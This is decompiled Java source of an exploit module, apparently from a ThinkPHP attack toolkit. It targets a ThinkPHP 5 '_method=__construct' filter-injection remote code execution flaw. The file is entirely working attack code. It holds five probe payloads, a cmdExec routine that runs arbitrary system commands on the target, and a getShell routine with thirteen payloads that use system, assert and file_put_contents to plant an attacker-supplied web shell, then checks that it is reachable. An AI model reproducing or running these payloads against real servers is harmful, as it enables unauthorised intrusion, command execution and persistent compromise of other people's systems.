/*     */ package dylan.exp;
/*     */ 
/*     */ import dylan.model.BaseExp;
/*     */ import dylan.model.Response;
/*     */ import dylan.tools.HttpTool;
/*     */ import dylan.tools.Util;
/*     */ import java.io.UnsupportedEncodingException;
/*     */ import java.net.URLEncoder;
/*     */ import java.nio.charset.StandardCharsets;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Base64;
/*     */ import java.util.HashMap;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class tp5_index_construct_rce
/*     */   implements BaseExp
/*     */ {
/*  23 */   private String results = null;
/*  24 */   private final HashMap<String, String> property = new HashMap<>();
/*     */ 
/*     */   
/*     */   public String vulCheck(String url) {
/*  28 */     url = url + "/index.php?s=index/index/index";
/*  29 */     String rdmStr = Util.getRandomString(5);
/*  30 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/*  31 */     ArrayList<String> payloads = new ArrayList<>();
/*  32 */     String payload1 = "s=" + rdmStr + "&_method=__construct&method&filter[]=var_dump";
/*  33 */     String payload2 = "s=" + rdmStr + "&_method=__construct&method=POST&filter[]=var_dump";
/*  34 */     String payload3 = "s=" + rdmStr + "&_method=__construct&method=GET&filter[]=var_dump";
/*  35 */     String payload4 = "_method=__construct&method=GET&filter[]=var_dump&get[]=" + rdmStr;
/*  36 */     String payload5 = "c=var_dump&f=" + rdmStr + "&_method=filter";
/*  37 */     payloads.add(payload1);
/*  38 */     payloads.add(payload2);
/*  39 */     payloads.add(payload3);
/*  40 */     payloads.add(payload4);
/*  41 */     payloads.add(payload5);
/*  42 */     for (String payload : payloads) {
/*  43 */       Response response = HttpTool.post(url, payload, this.property);
/*  44 */       if (response.getText().contains("string(5) \"" + rdmStr + "\"")) {
/*  45 */         this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/*  46 */         return this.results;
/*     */       } 
/*  48 */       if (response.getError() != null) {
/*  49 */         this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/*  50 */         return this.results;
/*     */       } 
/*     */     } 
/*  53 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/*  54 */     return this.results;
/*     */   }
/*     */ 
/*     */   
/*     */   public String cmdExec(String url, String cmd) {
/*     */     try {
/*  60 */       cmd = URLEncoder.encode(cmd, "UTF-8");
/*  61 */       ArrayList<String> payloads = new ArrayList<>();
/*  62 */       url = url + "/index.php?s=index/index/index";
/*  63 */       this.property.put("Content-type", "application/x-www-form-urlencoded");
/*  64 */       String payload1 = "s=" + cmd + "&_method=__construct&method&filter[]=system";
/*  65 */       String payload2 = "s=" + cmd + "&_method=__construct&method=POST&filter[]=system";
/*  66 */       String payload3 = "s=" + cmd + "&_method=__construct&method=GET&filter[]=system";
/*  67 */       String payload4 = "_method=__construct&method=GET&filter[]=system&get[]=" + cmd;
/*  68 */       String payload5 = "c=system&f=" + cmd + "&_method=filter";
/*  69 */       payloads.add(payload1);
/*  70 */       payloads.add(payload2);
/*  71 */       payloads.add(payload3);
/*  72 */       payloads.add(payload4);
/*  73 */       payloads.add(payload5);
/*  74 */       for (String payload : payloads) {
/*  75 */         Response response = HttpTool.post(url, payload, this.property);
/*  76 */         if (response.getError() == null && response.getCode() != 500) {
/*  77 */           this.results = Util.regReplace(response.getText());
/*  78 */           return this.results;
/*     */         } 
/*  80 */         this.results = response.getError();
/*     */       }
/*     */     
/*  83 */     } catch (UnsupportedEncodingException e) {
/*  84 */       this.results = e.getMessage();
/*     */     } 
/*  86 */     return this.results;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getShell(String url, String fileName, String content) {
/*     */     try {
/*  92 */       ArrayList<String> payloads = new ArrayList<>();
/*  93 */       String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/*  94 */       content = URLEncoder.encode(base64Content, "UTF-8");
/*  95 */       String payload1 = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method&filter[]=assert";
/*     */       
/*  97 */       String payload2 = "echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName + "&_method=__construct&method=POST&filter[]=system";
/*     */       
/*  99 */       String payload3 = "echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName + "&_method=__construct&method=POST&filter[]=system";
/* 100 */       String payload4 = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method=POST&filter[]=assert";
/*     */ 
/*     */       
/* 103 */       String payload5 = "echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName + "&_method=__construct&method=GET&filter[]=system";
/*     */       
/* 105 */       String payload6 = "echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName + "&_method=__construct&method=GET&filter[]=system";
/* 106 */       String payload7 = "s=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=__construct&method=GET&filter[]=assert";
/*     */ 
/*     */       
/* 109 */       String payload8 = "_method=__construct&method=GET&filter[]=system&get[]=echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName;
/*     */       
/* 111 */       String payload9 = "_method=__construct&method=GET&filter[]=system&get[]=echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName;
/* 112 */       String payload10 = "_method=__construct&method=GET&filter[]=assert&get[]=file_put_contents('" + fileName + "',base64_decode('" + content + "'))";
/*     */ 
/*     */       
/* 115 */       String payload11 = "c=system&f=echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName + "&_method=filter";
/*     */       
/* 117 */       String payload12 = "c=system&f=echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName + "&_method=filter";
/* 118 */       String payload13 = "c=assert&f=file_put_contents('" + fileName + "',base64_decode('" + content + "'))&_method=filter";
/* 119 */       payloads.add(payload1);
/* 120 */       payloads.add(payload2);
/* 121 */       payloads.add(payload3);
/* 122 */       payloads.add(payload4);
/* 123 */       payloads.add(payload5);
/* 124 */       payloads.add(payload6);
/* 125 */       payloads.add(payload7);
/* 126 */       payloads.add(payload8);
/* 127 */       payloads.add(payload9);
/* 128 */       payloads.add(payload10);
/* 129 */       payloads.add(payload11);
/* 130 */       payloads.add(payload12);
/* 131 */       payloads.add(payload13);
/* 132 */       for (String payload : payloads) {
/* 133 */         this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 134 */         Response response = HttpTool.post(url + "/index.php?s=index/index/index", payload, this.property);
/* 135 */         System.out.println(response.getError());
/* 136 */         if (response.getError() == null) {
/* 137 */           this.property.clear();
/* 138 */           response = HttpTool.get(url + "/" + fileName, this.property);
/* 139 */           if (response.getCode() == 200) {
/* 140 */             this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 141 */             return this.results;
/*     */           } 
/*     */         } 
/*     */       } 
/* 145 */       tp5_session_fi_getshell tp5sfg = new tp5_session_fi_getshell();
/* 146 */       this.results = tp5sfg.getshell(url, "/index.php?s=index/index/index", fileName, base64Content);
/* 147 */     } catch (UnsupportedEncodingException e) {
/* 148 */       this.results = "[-] 上传失败: " + e.getMessage();
/*     */     } 
/* 150 */     return this.results;
/*     */   }
/*     */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_index_construct_rce.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */